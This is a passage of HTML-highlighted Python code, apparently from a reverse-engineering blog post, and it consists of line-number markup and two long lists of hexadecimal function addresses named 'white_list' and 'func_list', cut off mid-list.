class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br></pre></td><td class="code"><pre><code class="hljs py">white_list = [<br>    <span class="hljs-number">0x0000000140001010</span>,<br>    <span class="hljs-number">0x0000000140001050</span>,<br>    <span class="hljs-number">0x0000000140001070</span>,<br>    <span class="hljs-number">0x0000000140001090</span>,<br>    <span class="hljs-number">0x00000001400010B0</span>,<br>    <span class="hljs-number">0x0000000140001110</span>,<br>    <span class="hljs-number">0x0000000140001170</span>,<br>    <span class="hljs-number">0x00000001400011B0</span>,<br>    <span class="hljs-number">0x00000001400011F0</span>,<br>    <span class="hljs-number">0x0000000140001250</span>,<br>    <span class="hljs-number">0x00000001400012D0</span>,<br>    <span class="hljs-number">0x0000000140001370</span>,<br>    <span class="hljs-number">0x0000000140001390</span>,<br>    <span class="hljs-number">0x00000001400013F0</span>,<br>    <span class="hljs-number">0x0000000140001410</span>,<br>    <span class="hljs-number">0x0000000140001430</span>,<br>    <span class="hljs-number">0x0000000140001470</span>,<br>    <span class="hljs-number">0x0000000140001490</span>,<br>    <span class="hljs-number">0x00000001400014D0</span>,<br>    <span class="hljs-number">0x00000001400014F0</span>,<br>    <span class="hljs-number">0x0000000140001510</span>,<br>    <span class="hljs-number">0x0000000140001570</span>,<br>    <span class="hljs-number">0x00000001400015B0</span>,<br>    <span class="hljs-number">0x00000001400015F0</span>,<br>    <span class="hljs-number">0x0000000140001610</span>,<br>    <span class="hljs-number">0x0000000140001630</span>,<br>    <span class="hljs-number">0x00000001400016B0</span>,<br>    <span class="hljs-number">0x00000001400016D0</span>,<br>    <span class="hljs-number">0x0000000140001710</span>,<br>    <span class="hljs-number">0x0000000140001730</span>,<br>    <span class="hljs-number">0x0000000140001790</span>,<br>    <span class="hljs-number">0x00000001400017D0</span>,<br>    <span class="hljs-number">0x00000001400017F0</span>,<br>    <span class="hljs-number">0x0000000140001810</span>,<br>    <span class="hljs-number">0x00000001400018F0</span>,<br>    <span class="hljs-number">0x0000000140001910</span>,<br>    <span class="hljs-number">0x0000000140001990</span>,<br>    <span class="hljs-number">0x00000001400019F0</span>,<br>    <span class="hljs-number">0x0000000140001A50</span>,<br>    <span class="hljs-number">0x0000000140001AF0</span>,<br>    <span class="hljs-number">0x0000000140001B10</span>,<br>    <span class="hljs-number">0x0000000140001B30</span>,<br>    <span class="hljs-number">0x0000000140001BB0</span>,<br>    <span class="hljs-number">0x0000000140001BF0</span>,<br>    <span class="hljs-number">0x0000000140001C70</span>,<br>    <span class="hljs-number">0x0000000140001CB0</span>,<br>    <span class="hljs-number">0x0000000140001CF0</span>,<br>    <span class="hljs-number">0x0000000140001D70</span>,<br>    <span class="hljs-number">0x0000000140001DB0</span>,<br>    <span class="hljs-number">0x0000000140001E50</span>,<br>    <span class="hljs-number">0x0000000140001EB0</span>,<br>    <span class="hljs-number">0x0000000140001ED0</span>,<br>    <span class="hljs-number">0x0000000140001F50</span>,<br>    <span class="hljs-number">0x0000000140001F70</span>,<br>    <span class="hljs-number">0x0000000140001F90</span>,<br>    <span class="hljs-number">0x0000000140001FD0</span>,<br>    <span class="hljs-number">0x0000000140001FF0</span>,<br>    <span class="hljs-number">0x0000000140002010</span>,<br>    <span class="hljs-number">0x0000000140002030</span>,<br>    <span class="hljs-number">0x0000000140002050</span>,<br>    <span class="hljs-number">0x0000000140002070</span>,<br>    <span class="hljs-number">0x0000000140002090</span>,<br>    <span class="hljs-number">0x00000001400020F0</span>,<br>    <span class="hljs-number">0x0000000140002110</span>,<br>    <span class="hljs-number">0x0000000140002150</span>,<br>    <span class="hljs-number">0x00000001400021B0</span>,<br>    <span class="hljs-number">0x0000000140002210</span>,<br>    <span class="hljs-number">0x0000000140002250</span>,<br>    <span class="hljs-number">0x0000000140002270</span>,<br>    <span class="hljs-number">0x0000000140002290</span>,<br>    <span class="hljs-number">0x00000001400022F0</span>,<br>    <span class="hljs-number">0x0000000140002350</span>,<br>    <span class="hljs-number">0x0000000140002390</span>,<br>    <span class="hljs-number">0x00000001400023D0</span>,<br>    <span class="hljs-number">0x0000000140002410</span>,<br>    <span class="hljs-number">0x0000000140002430</span>,<br>    <span class="hljs-number">0x0000000140002450</span>,<br>    <span class="hljs-number">0x0000000140002490</span>,<br>    <span class="hljs-number">0x00000001400024B0</span>,<br>    <span class="hljs-number">0x00000001400024D0</span>,<br>    <span class="hljs-number">0x0000000140002530</span>,<br>    <span class="hljs-number">0x0000000140002570</span>,<br>    <span class="hljs-number">0x00000001400025B0</span>,<br>    <span class="hljs-number">0x0000000140002610</span>,<br>    <span class="hljs-number">0x0000000140002650</span>,<br>    <span class="hljs-number">0x0000000140002690</span>,<br>    <span class="hljs-number">0x00000001400026D0</span>,<br>    <span class="hljs-number">0x0000000140002710</span>,<br>    <span class="hljs-number">0x0000000140002730</span>,<br>    <span class="hljs-number">0x0000000140002790</span>,<br>    <span class="hljs-number">0x00000001400027F0</span>,<br>    <span class="hljs-number">0x0000000140002850</span>,<br>    <span class="hljs-number">0x00000001400028B0</span>,<br>    <span class="hljs-number">0x00000001400028D0</span>,<br>    <span class="hljs-number">0x0000000140002970</span>,<br>    <span class="hljs-number">0x00000001400029D0</span>,<br>    <span class="hljs-number">0x00000001400029F0</span>,<br>    <span class="hljs-number">0x0000000140002A10</span>,<br>    <span class="hljs-number">0x0000000140002A70</span>,<br>    <span class="hljs-number">0x0000000140002A90</span>,<br>    <span class="hljs-number">0x0000000140002AB0</span>,<br>    <span class="hljs-number">0x0000000140002AF0</span>,<br>    <span class="hljs-number">0x0000000140002BF0</span>,<br>    <span class="hljs-number">0x0000000140002C50</span>,<br>    <span class="hljs-number">0x0000000140002C90</span>,<br>    <span class="hljs-number">0x0000000140002CD0</span>,<br>    <span class="hljs-number">0x0000000140002D90</span>,<br>    <span class="hljs-number">0x0000000140002DF0</span>,<br>    <span class="hljs-number">0x0000000140002E90</span>,<br>    <span class="hljs-number">0x0000000140002EB0</span>,<br>    <span class="hljs-number">0x0000000140002ED0</span>,<br>    <span class="hljs-number">0x0000000140002EF0</span>,<br>    <span class="hljs-number">0x0000000140002F10</span>,<br>    <span class="hljs-number">0x0000000140002F50</span>,<br>    <span class="hljs-number">0x0000000140002F90</span>,<br>    <span class="hljs-number">0x0000000140002FF0</span>,<br>    <span class="hljs-number">0x0000000140003030</span>,<br>    <span class="hljs-number">0x0000000140003050</span>,<br>    <span class="hljs-number">0x0000000140003090</span>,<br>    <span class="hljs-number">0x0000000140003110</span>,<br>    <span class="hljs-number">0x0000000140003150</span>,<br>    <span class="hljs-number">0x0000000140003190</span>,<br>    <span class="hljs-number">0x00000001400031B0</span>,<br>    <span class="hljs-number">0x0000000140003210</span>,<br>    <span class="hljs-number">0x0000000140003270</span>,<br>    <span class="hljs-number">0x0000000140003290</span>,<br>    <span class="hljs-number">0x00000001400032D0</span>,<br>    <span class="hljs-number">0x00000001400032F0</span>,<br>    <span class="hljs-number">0x0000000140003330</span>,<br>    <span class="hljs-number">0x0000000140003410</span>,<br>    <span class="hljs-number">0x0000000140003430</span>,<br>    <span class="hljs-number">0x0000000140003450</span>,<br>    <span class="hljs-number">0x0000000140003470</span>,<br>    <span class="hljs-number">0x0000000140003490</span>,<br>    <span class="hljs-number">0x00000001400034B0</span>,<br>    <span class="hljs-number">0x0000000140003590</span>,<br>    <span class="hljs-number">0x0000000140003610</span>,<br>    <span class="hljs-number">0x0000000140003650</span>,<br>    <span class="hljs-number">0x0000000140003670</span>,<br>    <span class="hljs-number">0x00000001400036B0</span>,<br>    <span class="hljs-number">0x00000001400036D0</span>,<br>    <span class="hljs-number">0x0000000140003710</span>,<br>    <span class="hljs-number">0x00000001400037D0</span>,<br>    <span class="hljs-number">0x00000001400037F0</span>,<br>    <span class="hljs-number">0x0000000140003810</span>,<br>    <span class="hljs-number">0x0000000140003850</span>,<br>    <span class="hljs-number">0x0000000140003970</span>,<br>    <span class="hljs-number">0x00000001400039D0</span>,<br>    <span class="hljs-number">0x00000001400039F0</span>,<br>    <span class="hljs-number">0x0000000140003A30</span>,<br>    <span class="hljs-number">0x0000000140003AB0</span>,<br>    <span class="hljs-number">0x0000000140003AD0</span>,<br>    <span class="hljs-number">0x0000000140003AF0</span>,<br>    <span class="hljs-number">0x0000000140003B10</span>,<br>    <span class="hljs-number">0x0000000140003B30</span>,<br>    <span class="hljs-number">0x0000000140003BD0</span>,<br>    <span class="hljs-number">0x0000000140003C10</span>,<br>    <span class="hljs-number">0x0000000140003C50</span>,<br>    <span class="hljs-number">0x0000000140003C70</span>,<br>    <span class="hljs-number">0x0000000140003CD0</span>,<br>    <span class="hljs-number">0x0000000140003CF0</span>,<br>    <span class="hljs-number">0x0000000140003DD0</span>,<br>    <span class="hljs-number">0x0000000140003E10</span>,<br>    <span class="hljs-number">0x0000000140003E50</span>,<br>    <span class="hljs-number">0x0000000140003E70</span>,<br>    <span class="hljs-number">0x0000000140003E90</span>,<br>    <span class="hljs-number">0x0000000140003EF0</span>,<br>    <span class="hljs-number">0x0000000140003F10</span>,<br>    <span class="hljs-number">0x0000000140003F30</span>,<br>    <span class="hljs-number">0x0000000140003F70</span>,<br>    <span class="hljs-number">0x0000000140003FD0</span>,<br>    <span class="hljs-number">0x0000000140003FF0</span>,<br>    <span class="hljs-number">0x0000000140004010</span>,<br>    <span class="hljs-number">0x0000000140004070</span>,<br>    <span class="hljs-number">0x00000001400040B0</span>,<br>    <span class="hljs-number">0x00000001400040F0</span>,<br>    <span class="hljs-number">0x0000000140004170</span>,<br>    <span class="hljs-number">0x00000001400041B0</span>,<br>    <span class="hljs-number">0x00000001400041D0</span>,<br>    <span class="hljs-number">0x0000000140004210</span>,<br>    <span class="hljs-number">0x0000000140004230</span>,<br>    <span class="hljs-number">0x0000000140004270</span>,<br>    <span class="hljs-number">0x0000000140004290</span>,<br>    <span class="hljs-number">0x00000001400042B0</span>,<br>    <span class="hljs-number">0x00000001400042D0</span>,<br>    <span class="hljs-number">0x00000001400042F0</span>,<br>    <span class="hljs-number">0x0000000140004310</span>,<br>    <span class="hljs-number">0x0000000140004390</span>,<br>    <span class="hljs-number">0x00000001400043D0</span>,<br>    <span class="hljs-number">0x0000000140004410</span>,<br>    <span class="hljs-number">0x0000000140004430</span>,<br>    <span class="hljs-number">0x00000001400044F0</span>,<br>    <span class="hljs-number">0x0000000140004590</span>,<br>    <span class="hljs-number">0x00000001400045D0</span>,<br>    <span class="hljs-number">0x0000000140004610</span>,<br>    <span class="hljs-number">0x0000000140004630</span>,<br>    <span class="hljs-number">0x0000000140004650</span>,<br>    <span class="hljs-number">0x00000001400046D0</span>,<br>    <span class="hljs-number">0x00000001400046F0</span>,<br>    <span class="hljs-number">0x0000000140015420</span>,<br>    <span class="hljs-number">0x0000000140015560</span>,<br>    <span class="hljs-number">0x000000014003ADA0</span>,<br>    <span class="hljs-number">0x000000014003ADD0</span>,<br>    <span class="hljs-number">0x000000014003AE90</span>,<br>    <span class="hljs-number">0x000000014003B830</span>,<br>    <span class="hljs-number">0x000000014003D7E0</span>,<br>    <span class="hljs-number">0x000000014003D800</span>,<br>    <span class="hljs-number">0x000000014003D830</span>,<br>    <span class="hljs-number">0x000000014003D840</span>,<br>    <span class="hljs-number">0x000000014003D850</span>,<br>    <span class="hljs-number">0x000000014003D870</span>,<br>    <span class="hljs-number">0x000000014003D880</span>,<br>    <span class="hljs-number">0x000000014003D890</span>,<br>    <span class="hljs-number">0x000000014003D8E0</span>,<br>    <span class="hljs-number">0x000000014003D8F0</span>,<br>    <span class="hljs-number">0x000000014003D940</span>,<br>    <span class="hljs-number">0x000000014003D9B0</span>,<br>    <span class="hljs-number">0x000000014003DCB0</span>,<br>    <span class="hljs-number">0x0000000140040BC0</span>,<br>    <span class="hljs-number">0x0000000140042670</span>,<br>    <span class="hljs-number">0x0000000140042780</span>,<br>    <span class="hljs-number">0x0000000140043280</span>,<br>    <span class="hljs-number">0x00000001400432D0</span>,<br>    <span class="hljs-number">0x0000000140046650</span>,<br>    <span class="hljs-number">0x0000000140046E80</span>,<br>    <span class="hljs-number">0x0000000140046ED0</span>,<br>    <span class="hljs-number">0x0000000140047630</span>,<br>    <span class="hljs-number">0x0000000140047650</span>,<br>    <span class="hljs-number">0x000000014004A040</span>,<br>    <span class="hljs-number">0x000000014004B760</span>,<br>    <span class="hljs-number">0x000000014004B7D0</span>,<br>    <span class="hljs-number">0x000000014004C1C0</span>,<br>    <span class="hljs-number">0x000000014004C360</span>,<br>    <span class="hljs-number">0x000000014004CB30</span>,<br>    <span class="hljs-number">0x000000014004D100</span>,<br>    <span class="hljs-number">0x000000014004D9D0</span>,<br>    <span class="hljs-number">0x000000014004E570</span>,<br>    <span class="hljs-number">0x000000014004E860</span>,<br>    <span class="hljs-number">0x000000014004EE10</span>,<br>    <span class="hljs-number">0x000000014004F120</span>,<br>    <span class="hljs-number">0x000000014004F370</span>,<br>    <span class="hljs-number">0x000000014004FA40</span>,<br>    <span class="hljs-number">0x000000014004FA70</span>,<br>    <span class="hljs-number">0x000000014004FD90</span>,<br>    <span class="hljs-number">0x0000000140057710</span>,<br>    <span class="hljs-number">0x000000014005C840</span>,<br>    <span class="hljs-number">0x000000014005D270</span>,<br>    <span class="hljs-number">0x000000014005D310</span><br>]<br><br>func_list = [<br>    <span class="hljs-number">0x1400025F0</span>,<br>    <span class="hljs-number">0x140001EF0</span>,<br>    <span class="hljs-number">0x1400039B0</span>,<br>    <span class="hljs-number">0x140004090</span>,<br>    <span class="hljs-number">0x140002F70</span>,<br>    <span class="hljs-number">0x140003B70</span>,<br>    <span class="hljs-number">0x140002590</span>,<br>    <span class="hljs-number">0x140001210</span>,<br>    <span class="hljs-number">0x140002E70</span>,<br>    <span class="hljs-number">0x140004370</span>,<br>    <span class="hljs-number">0x140001E70</span>,<br>    <span class="hljs-number">0x140003A50</span>,<br>    <span class="hljs-number">0x140003D70</span>,<br>    <span class="hljs-number">0x1400033F0</span>,<br>    <span class="hljs-number">0x140002B50</span>,<br>    <span class="hljs-number">0x140003070</span>,<br>    <span class="hljs-number">0x140004250</span>,<br>    <span class="hljs-number">0x140003230</span>,<br>    <span class="hljs-number">0x1400013D0</span>,<br>    <span class="hljs-number">0x140002E30</span>,<br>    <span class="hljs-number">0x140002B10</span>,<br>    <span class="hljs-number">0x140001D50</span>,<br>    <span class="hljs-number">0x140001ED0</span>,<br>    <span class="hljs-number">0x140002190</span>,<br>    <span class="hljs-number">0x140001370</span>,<br>    <span class="hljs-number">0x1400016B0</span>,<br>    <span class="hljs-number">0x140004430</span>,<br>    <span class="hljs-number">0x140001770</span>,<br>    <span class="hljs-number">0x140004230</span>,<br>    <span class="hljs-number">0x140002530</span>,<br>    <span class="hljs-number">0x140002290</span>,<br>    <span class="hljs-number">0x140001710</span>,<br>    <span class="hljs-number">0x1400010B0</span>,<br>    <span class="hljs-number">0x1400015B0</span>,<br>    <span class="hljs-number">0x1400037D0</span>,<br>    <span 